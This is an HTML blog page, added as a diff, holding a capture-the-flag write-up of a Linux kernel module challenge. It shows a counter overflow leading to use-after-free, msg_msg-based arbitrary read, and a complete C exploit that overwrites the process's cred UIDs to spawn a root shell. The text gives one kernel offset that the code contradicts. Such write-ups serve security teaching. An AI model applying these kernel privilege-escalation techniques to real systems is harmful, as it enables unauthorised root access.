@@ -1,0 +1,812 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>TeamItalyCTF 2022 - FamilyRecipes | leo_something</title>
+<meta name="keywords" content="pwn, kernel, uaf">
+<meta name="description" content="This is one of the first heap related kernel challenges I solved, so this writeup could be inaccurate in some spots.">
+<meta name="author" content="leo_something">
+<link rel="canonical" href="http://leo1.cc/posts/writeups/teamitalyctf22-familyrecipes/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.62bb6a5e71ed8590b51185096e2d3dea8379889277e03fcf9ef8a01b0f6d9dc0.css" integrity="sha256-YrtqXnHthZC1EYUJbi096oN5iJJ34D/PnvigGw9tncA=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://leo1.cc/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://leo1.cc/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://leo1.cc/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://leo1.cc/apple-touch-icon.png">
+<link rel="mask-icon" href="http://leo1.cc/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://leo1.cc/posts/writeups/teamitalyctf22-familyrecipes/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:url" content="http://leo1.cc/posts/writeups/teamitalyctf22-familyrecipes/">
+  <meta property="og:site_name" content="leo_something">
+  <meta property="og:title" content="TeamItalyCTF 2022 - FamilyRecipes">
+  <meta property="og:description" content="This is one of the first heap related kernel challenges I solved, so this writeup could be inaccurate in some spots.">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-01-28T14:22:00+00:00">
+    <meta property="article:modified_time" content="2025-01-28T14:22:00+00:00">
+    <meta property="article:tag" content="Pwn">
+    <meta property="article:tag" content="Kernel">
+    <meta property="article:tag" content="Uaf">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="TeamItalyCTF 2022 - FamilyRecipes">
+<meta name="twitter:description" content="This is one of the first heap related kernel challenges I solved, so this writeup could be inaccurate in some spots.">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "http://leo1.cc/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "TeamItalyCTF 2022 - FamilyRecipes",
+      "item": "http://leo1.cc/posts/writeups/teamitalyctf22-familyrecipes/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "TeamItalyCTF 2022 - FamilyRecipes",
+  "name": "TeamItalyCTF 2022 - FamilyRecipes",
+  "description": "This is one of the first heap related kernel challenges I solved, so this writeup could be inaccurate in some spots.",
+  "keywords": [
+    "pwn", "kernel", "uaf"
+  ],
+  "articleBody": "Overview The challenge consists in a kernel module that allows a user to store “recipes”.\nTo communicate with the device we are provided with an ioctl interface that enables us to do the following:\nAllocate a recipe Delete a recipe Read a recipe Get information about a recipe Toggle private mode for a recipe typedef struct recipe { char *buf; unsigned long bufsize; unsigned int public; uid_t owner_uid; } recipe_t; Structure of a recipe\nRecipes are stored using this manager object:\ntypedef struct recipe_manager { recipe_t **recipes_list; unsigned char num_of_recipes; } recipe_manager_t; Alloc To successfully allocate a recipe we need to provide the following parameters:\nstruct alloc { unsigned long idx; char* buf; unsigned long bufsize; unsigned int public; } alloc; Now the allocation process is pretty straight forward:\nIncrease num_of_recipes Check if recipes_list exists and allocate it if it doesn’t Check if there is free space in the recipes_list, if not krealloc it Allocate a chunk for recipe.buf and fill it with the provided data Allocate a recipe and place inside it all of the provided data Add the recipe to recipes_list Return the index of the recipe inside recipes_list Delete To delete a recipe you just pass the index:\nstruct delete { unsigned long idx; } delete; If the index is smaller than num_of_recipes then recipe.buf and recipe itself get freed and the latter removed from recipes_list, pretty easy.\nRead Read just allows you to get the contents of recipe.buf. The needed parameter are the following:\nstruct read { unsigned long idx; char *buf; unsigned long bufsize; } read; Here bufsize must be smaller than the original bufsize provided on allocation. The contents of the buffer will be returned through buf.\nInfo This functionality enables a user to retrieve information about a recipe, using the following structure:\nstruct info { unsigned long idx; unsigned long bufsize; unsigned int public; uid_t owner_uid; } info; Nothing really to say except:\nrequest.info.bufsize = recipe-\u003ebufsize; request.info.owner_uid = recipe-\u003eowner_uid; request.info.public = recipe-\u003epublic; Toggle Provide the index of an existing recipe:\nstruct toggle { unsigned long idx; } toggle; The recipe.public property gets toggled.\nVulnerability To be honest, I needed several reads of the code to finally find the vulnerability, which was very well hidden. If you have a sharp sight you might have noticed a weird declaration in the struct above; let me refresh your memory:\ntypedef struct recipe_manager { recipe_t **recipes_list; unsigned char num_of_recipes; } recipe_manager_t; unsigned char sounds like integer overflow!\nIf we allocate 256 recipes, the last one will overflow num_of_recipes back to 0, and as krealloc gets called as follows:\nkrealloc(manager.recipes_list, sizeof(recipe_t *) * manager.num_of_recipes, GFP_KERNEL); if manager.num_of_recipes is 0 we are freeing manager.recipes_list. This is because krealloc with size 0 behaves like kfree.\nThis creates a UAF primitive: we can use recipes_list even tho it’s freed and thus control the pointers contained in that list by allocating something else over it!\n(I only drew this horror to force myself to learn how to use a graphics tablet, I’m sorry for your eyes)\nAs you can see the num_of_recipes is 0xff even tho we achieved UAF. This is because krealloc doesn’t return a valid ptr and num_of_recipes is the decremented as part of the error handling.\n// tmp is the ptr returned by krealloc if (ZERO_OR_NULL_PTR(tmp)) { printk(KERN_INFO \"[CHALL] [ERR] (Re)allocation failed\\n\"); manager.num_of_recipes--; goto error; } Exploitation First of all, we need to leak some cache addresses. The plan is to allocate an msg_msg struct of 2048 bytes over the recipes_list, with the contents of msg_msg we can tamper with the list of pointers. If you want to know more about msg_msg read my previous article: https://leo1.cc/posts/docs/msg_msg.\nArbitrary read Tampering with the recipes_list means writing arbitrary pointer into it, enabling us to arbitrary read memory. The read_recipe functionality of the module is not the best way to achieve the primitive we are looking for, since the check of the owner_id is quite limiting.\nHowever, the get_info comes to our rescue: this functionality is not restricted by the owner_uid check, thus we can read arbitrary locations through recipe.bufsize, recipe.public and recipe.owner_id. For the sake of simplicity I’ll stick to the first one, as it enables us read a full qword.\nI wrote this function to simplify the process:\nulong read_qword(ulong addr){ // alloc msg_msg over recipes_list struct msgbuf { long mtype; char mtext[2000]; } msg; msg.mtype = 1; // place a pointer just after msg_msg metadata (index 6 of recipes_list) ulong *ptr = (ulong *)\u0026msg.mtext; ptr[0] = addr - 8; // recipe.bufsize overlaps the qword to read int qid = alloc_msg(\u0026msg, sizeof(msg.mtext)); free_msg(qid, \u0026msg, sizeof(msg.mtext)); // get the bufsize struct info leak; info_recipe(6, \u0026leak); return leak.bufsize; } Achieve RCE First idea: tty_struct struct tty_struct { int magic; // paranoia check struct kref kref; // reference count struct device *dev; struct tty_driver *driver; // must be valid const struct tty_operations *ops; // ptr to vtable ... } To pull this off I needed first to leak the kmalloc-2k cache (the one where the recipes_list resides). To do that I leveraged some pointers in the metadata of msg_msg struct. Once leaked kmalloc-2k I could basically leak every cache up to kmalloc-1k, using my arbitrary read primitive and the capability of allocating arbitrary chunks of size 8 to 1024 bytes (buffer chunks).\nThe plan then was the following:\nforge a fake recipe (place as buf a pointer to tty_struct) free the fake recipe (UAF on tty_struct) allocate a recipe with bufsize of 1024 (override tty_struct) to pass paranoia check tty_struct.magic should be 0x5401 override tty_struct.ops with a pointer to a fake vtable of size 0x120 use this gadget to achieve arbitrary write and override modprobe_path As you may know, to allocate a tty_struct you need to open /dev/ptmx, which triggers a call to ptmx_open which, in turn, is responsible of allocating our beloved tty_struct. The trouble is that an extra check is done before the allocation:\nfsi = devpts_acquire(filp); if (IS_ERR(fsi)) { retval = PTR_ERR(fsi); goto out_free_file; } This tries to interact with /dev/pts. Unfortunately this device is not mounted in this challenge environment. Dead end :/\nSecond idea: UAF a pipe_buffer As I recently read about an heap struct called pipe_buffer (reading this article) and tty_struct exploitation didn’t work out as expected, I thought about trying to achieve arbitrary write through pipes.\nI didn’t actually test this idea because I had another brainwave (next paragraph), however, sooner or later I will try to use this method and update the post.\nThird idea: override cred struct The challenge module contains the toggle command, which could be used to write zero integers at arbitrary memory locations. This comes with some serious constraints:\nbefore using this functionality we must be sure that the location we are toggling isn’t already empty, otherwise we would write a one in it recipes.owner_uid must be equal to our uid, meaning that the word right under the location we want to toggle must be set to 1000 A feasible target for this constrained arbitrary write is the cred struct of our exploit:\nstruct cred{ atomic_long_t usage; kuid_t\tuid;\t/* real UID of the task */ kgid_t\tgid;\t/* real GID of the task */ kuid_t\tsuid;\t/* saved UID of the task */ kgid_t\tsgid;\t/* saved GID of the task */ kuid_t\teuid;\t/* effective UID of the task */ kgid_t\tegid;\t/* effective GID of the task */ kuid_t\tfsuid;\t/* UID for VFS ops */ kgid_t\tfsgid;\t/* GID for VFS ops */ ... } The complete cred struct definition can be found here\nkuid_t is a struct containing an unsigned int, so we are talking about 4 bytes in memory. The idea is now to set some UIDs to 0, meaning root privileges for our exploit!\nOne of the bigger issues I faced was finding a way to leak the address of the correct cred struct. (remember that I’m still a noob at kpwn and kernel debugging)\nEvery process has an associated task_struct, which contains loads of information, including a pointer to the credentials of such process. The structs are linked in a linked-list, starting from init_task, this represents the process with pid 1. init_task is located in the kernel data region and, as KASLR is disabled, we know precisely where that is. The other tasks, however, are dynamically allocated and so are the creds.\nWe need to traverse the linked list until we find the task_struct containing the pid of our exploit, retrieve the address of the cred struct and override some UIDs.\nNow, the structure of a task_struct is available here, but getting the correct offsets for useful fields is not a piece of cake. However, after some debugging and guessing I retrieved the following:\ntask_struct.pid at offset 0x560 task_struct.tasks (pointer to next task_struct) at offset 0x548 task_struct.real_cred (pointer to cred struct) at offset 0x728 Now it’s just a matter of painless scripting.\nFinal Exploit #include #include #include #include #include #include #include #include #include #define CHALLENGE_DRIVER \"/dev/chall\" #define CMD_ALLOC 1337 #define CMD_DELETE 1338 #define CMD_READ 1339 #define CMD_INFO 1340 #define CMD_TOGGLE 1341 static int fd; typedef union request { struct alloc { unsigned long idx; char* buf; unsigned long bufsize; unsigned int public; } alloc; struct delete { unsigned long idx; } delete; struct read { unsigned long idx; char *buf; unsigned long bufsize; } read; struct info { unsigned long idx; unsigned long bufsize; unsigned int public; uid_t owner_uid; } info; struct toggle { unsigned long idx; } toggle; } request_t; ulong alloc_recipe(char *buf, ulong bufsize, uint public){ request_t request; request.alloc.buf = buf; request.alloc.bufsize = bufsize; request.alloc.public = public; ioctl(fd, CMD_ALLOC, \u0026request); return request.alloc.idx; } void read_recipe(ulong idx, char *buf, ulong bufsize){ request_t request; request.read.idx = idx; request.read.buf = buf; request.read.bufsize = bufsize; ioctl(fd, CMD_READ, \u0026request); } void delete_recipe(ulong idx){ request_t request; request.delete.idx = idx; ioctl(fd, CMD_DELETE, \u0026request); } void info_recipe(ulong idx, struct info* info){ request_t request; request.info.idx = idx; ioctl(fd, CMD_INFO, \u0026request); info-\u003ebufsize = request.info.bufsize; info-\u003eowner_uid = request.info.owner_uid; info-\u003epublic = request.info.public; } void toggle_recipe(ulong idx){ request_t request; request.toggle.idx = idx; ioctl(fd, CMD_TOGGLE, \u0026request); } int alloc_msg(void* data, size_t size){ int qid; qid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT); msgsnd(qid, data, size-0x30, 0); return qid; } void free_msg(int qid, void* buf, size_t size){ msgrcv(qid, buf, size, 0, IPC_NOWAIT | MSG_NOERROR); } void leak(char* what, unsigned long where){ printf(\"%s @ %p\\n\", what, (void*) where); } ulong read_qword(ulong addr){ // alloc msg_msg over recipes_list struct msgbuf { long mtype; char mtext[2000]; } msg; msg.mtype = 1; // place a pointer just after msg_msg metadata (index 6 of recipes_list) ulong *ptr = (ulong *)\u0026msg.mtext; ptr[0] = addr - 8; // recipe.bufsize overlaps the qword to read int qid = alloc_msg(\u0026msg, sizeof(msg.mtext)); free_msg(qid, \u0026msg, sizeof(msg.mtext)); // get the bufsize struct info leak; info_recipe(6, \u0026leak); return leak.bufsize; } void change_uid(ulong addr){ // alloc msg_msg over recipes_list struct msgbuf { long mtype; char mtext[2000]; } msg; msg.mtype = 1; // place a pointer just after msg_msg metadata (index 6 of recipes_list) ulong *ptr = (ulong *)\u0026msg.mtext; ptr[0] = addr - 0x10; // recipe.public overlaps the uid we want to change int qid = alloc_msg(\u0026msg, sizeof(msg.mtext)); free_msg(qid, \u0026msg, sizeof(msg.mtext)); toggle_recipe(6); // toggle uid (from 1000 to 0) } #define INIT_TASK 0xffffffff828149c0 #define NEXT_TASK_OFF 0x458 #define PID_OFF 0x560 #define CREDS_OFF 0x728 int main(int argc, char **argv) { fd = open(CHALLENGE_DRIVER, O_RDWR | O_NONBLOCK); ulong bufsize = 0x300; char *buf = malloc(bufsize); memset(buf, 0x41, sizeof(buf)); // make manger.num_of_recipes = 0xff for(int i=0; i\u003c0xff; i++){ alloc_recipe(buf, bufsize, 1); } // overflow manager.num_of_recipes back to 0 // krealloc will free manager.recipes_list [krealloc(ptr, 0) = kfree(ptr)] // we gained UAF on the recipes_list alloc_recipe(buf, bufsize, 1); ulong current_task = INIT_TASK; uint pid = getpid(); while(1){ uint current_pid = (uint)read_qword(current_task+PID_OFF); if(current_pid == pid){ break; }else{ current_task = read_qword(current_task+NEXT_TASK_OFF)-NEXT_TASK_OFF; } } leak(\"Current task\", current_task); ulong creds = read_qword(current_task+CREDS_OFF); leak(\"Creds\", creds); change_uid(creds+20); // EUID (effective UID) change_uid(creds+4); // current UID system(\"/bin/sh\"); return 0; } Note: first override the euid and then the uid, otherwise you won’t be able to change the euid, for some reason.\n",
+  "wordCount" : "2005",
+  "inLanguage": "en",
+  "datePublished": "2025-01-28T14:22:00Z",
+  "dateModified": "2025-01-28T14:22:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "leo_something"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "http://leo1.cc/posts/writeups/teamitalyctf22-familyrecipes/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "leo_something",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "http://leo1.cc/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://leo1.cc/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://leo1.cc/categories/" title="Categories">
+                    <span>Categories</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://leo1.cc/tags/" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://leo1.cc/search/" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      TeamItalyCTF 2022 - FamilyRecipes
+    </h1>
+    <div class="post-meta"><span title='2025-01-28 14:22:00 +0000 UTC'>January 28, 2025</span>&nbsp;·&nbsp;leo_something
+
+</div>
+  </header>
+  <div class="tags" style="padding: 2px;">
+    <div style="display: flex; flex-wrap: wrap; gap: 5px;">
+      
+      <a href="/tags/pwn" class="custom-tag">
+        pwn
+      </a>
+      
+      <a href="/tags/kernel" class="custom-tag">
+        kernel
+      </a>
+      
+      <a href="/tags/uaf" class="custom-tag">
+        uaf
+      </a>
+      
+    </div>
+  </div>
+
+  <div style="height: var(--gap);"></div> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#overview" aria-label="Overview">Overview</a><ul>
+                        <ul>
+                        
+                <li>
+                    <a href="#alloc" aria-label="Alloc">Alloc</a></li>
+                <li>
+                    <a href="#delete" aria-label="Delete">Delete</a></li>
+                <li>
+                    <a href="#read" aria-label="Read">Read</a></li>
+                <li>
+                    <a href="#info" aria-label="Info">Info</a></li>
+                <li>
+                    <a href="#toggle" aria-label="Toggle">Toggle</a></li></ul>
+                    </ul>
+                </li>
+                <li>
+                    <a href="#vulnerability" aria-label="Vulnerability">Vulnerability</a></li>
+                <li>
+                    <a href="#exploitation" aria-label="Exploitation">Exploitation</a><ul>
+                        
+                <li>
+                    <a href="#arbitrary-read" aria-label="Arbitrary read">Arbitrary read</a></li>
+                <li>
+                    <a href="#achieve-rce" aria-label="Achieve RCE">Achieve RCE</a><ul>
+                        
+                <li>
+                    <a href="#first-idea-tty_struct" aria-label="First idea: tty_struct">First idea: tty_struct</a></li>
+                <li>
+                    <a href="#second-idea-uaf-a-pipe_buffer" aria-label="Second idea: UAF a pipe_buffer">Second idea: UAF a pipe_buffer</a></li>
+                <li>
+                    <a href="#third-idea-override-cred-struct" aria-label="Third idea: override cred struct">Third idea: override cred struct</a></li>
+                <li>
+                    <a href="#final-exploit" aria-label="Final Exploit">Final Exploit</a>
+                </li>
+            </ul>
+            </li>
+            </ul>
+            </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h2 id="overview">Overview<a hidden class="anchor" aria-hidden="true" href="#overview">#</a></h2>
+<p>The challenge consists in a kernel module that allows a user to store &ldquo;recipes&rdquo;.</p>
+<p>To communicate with the device we are provided with an ioctl interface that enables us to do the following:</p>
+<ul>
+<li>Allocate a recipe</li>
+<li>Delete a recipe</li>
+<li>Read a recipe</li>
+<li>Get information about a recipe</li>
+<li>Toggle private mode for a recipe</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> recipe {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>buf;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> bufsize;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> public;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">uid_t</span> owner_uid;
+</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">recipe_t</span>;
+</span></span></code></pre></div><p><em>Structure of a recipe</em></p>
+<p>Recipes are stored using this manager object:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> recipe_manager {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">recipe_t</span> <span style="color:#f92672">**</span>recipes_list;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> num_of_recipes;
+</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">recipe_manager_t</span>;
+</span></span></code></pre></div><h4 id="alloc">Alloc<a hidden class="anchor" aria-hidden="true" href="#alloc">#</a></h4>
+<p>To successfully allocate a recipe we need to provide the following parameters:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> alloc {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> idx;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> buf;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> bufsize;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> public;
+</span></span><span style="display:flex;"><span>} alloc;
+</span></span></code></pre></div><p>Now the allocation process is pretty straight forward:</p>
+<ol>
+<li>Increase <code>num_of_recipes</code></li>
+<li>Check if <code>recipes_list</code> exists and allocate it if it doesn&rsquo;t</li>
+<li>Check if there is free space in the <code>recipes_list</code>, if not krealloc it</li>
+<li>Allocate a chunk for <code>recipe.buf</code> and fill it with the provided data</li>
+<li>Allocate a recipe and place inside it all of the provided data</li>
+<li>Add the recipe to <code>recipes_list</code></li>
+<li>Return the index of the recipe inside <code>recipes_list</code></li>
+</ol>
+<h4 id="delete">Delete<a hidden class="anchor" aria-hidden="true" href="#delete">#</a></h4>
+<p>To delete a recipe you just pass the index:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> delete {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> idx;
+</span></span><span style="display:flex;"><span>} delete;
+</span></span></code></pre></div><p>If the index is smaller than <code>num_of_recipes</code> then <code>recipe.buf</code> and <code>recipe</code> itself get freed and the latter removed from <code>recipes_list</code>, pretty easy.</p>
+<h4 id="read">Read<a hidden class="anchor" aria-hidden="true" href="#read">#</a></h4>
+<p>Read just allows you to get the contents of <code>recipe.buf</code>. The needed parameter are the following:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> read {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> idx;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>buf;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> bufsize;
+</span></span><span style="display:flex;"><span>} read;
+</span></span></code></pre></div><p>Here <code>bufsize</code> must be smaller than the original bufsize provided on allocation.
+The contents of the buffer will be returned through <code>buf</code>.</p>
+<h4 id="info">Info<a hidden class="anchor" aria-hidden="true" href="#info">#</a></h4>
+<p>This functionality enables a user to retrieve information about a recipe, using the following structure:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> info {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> idx;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> bufsize;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> public;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">uid_t</span> owner_uid;
+</span></span><span style="display:flex;"><span>} info;
+</span></span></code></pre></div><p>Nothing really to say except:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>request.info.bufsize <span style="color:#f92672">=</span> recipe<span style="color:#f92672">-&gt;</span>bufsize;
+</span></span><span style="display:flex;"><span>request.info.owner_uid <span style="color:#f92672">=</span> recipe<span style="color:#f92672">-&gt;</span>owner_uid;
+</span></span><span style="display:flex;"><span>request.info.public <span style="color:#f92672">=</span> recipe<span style="color:#f92672">-&gt;</span>public;
+</span></span></code></pre></div><h4 id="toggle">Toggle<a hidden class="anchor" aria-hidden="true" href="#toggle">#</a></h4>
+<p>Provide the index of an existing recipe:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> toggle {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> idx;
+</span></span><span style="display:flex;"><span>} toggle;
+</span></span></code></pre></div><p>The <code>recipe.public</code> property gets toggled.</p>
+<h2 id="vulnerability">Vulnerability<a hidden class="anchor" aria-hidden="true" href="#vulnerability">#</a></h2>
+<p>To be honest, I needed several reads of the code to finally find the vulnerability, which was very well hidden.
+If you have a sharp sight you might have noticed a weird declaration in the struct above; let me refresh your memory:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> recipe_manager {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">recipe_t</span> <span style="color:#f92672">**</span>recipes_list;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> num_of_recipes;
+</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">recipe_manager_t</span>;
+</span></span></code></pre></div><p><strong>unsigned char</strong> sounds like integer overflow!</p>
+<p>If we allocate 256 recipes, the last one will overflow <code>num_of_recipes</code> back to 0, and as krealloc gets called as follows:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">krealloc</span>(manager.recipes_list, <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">recipe_t</span> <span style="color:#f92672">*</span>) <span style="color:#f92672">*</span> manager.num_of_recipes, GFP_KERNEL);
+</span></span></code></pre></div><p>if <code>manager.num_of_recipes</code> is 0 we are freeing <code>manager.recipes_list</code>.
+This is because krealloc with size 0 behaves like kfree.</p>
+<p>This creates a UAF primitive: we can use <code>recipes_list</code> even tho it&rsquo;s freed and thus control the pointers contained in that list by allocating something else over it!</p>
+<p><img alt="UAF" loading="lazy" src="/posts/writeups/teamitalyctf22-familyrecipes/uaf.png">
+<em>(I only drew this horror to force myself to learn how to use a graphics tablet, I&rsquo;m sorry for your eyes)</em></p>
+<p>As you can see the <code>num_of_recipes</code> is 0xff even tho we achieved UAF. This is because krealloc doesn&rsquo;t return a valid ptr and <code>num_of_recipes</code> is the decremented as part of the error handling.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// tmp is the ptr returned by krealloc
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">ZERO_OR_NULL_PTR</span>(tmp)) {
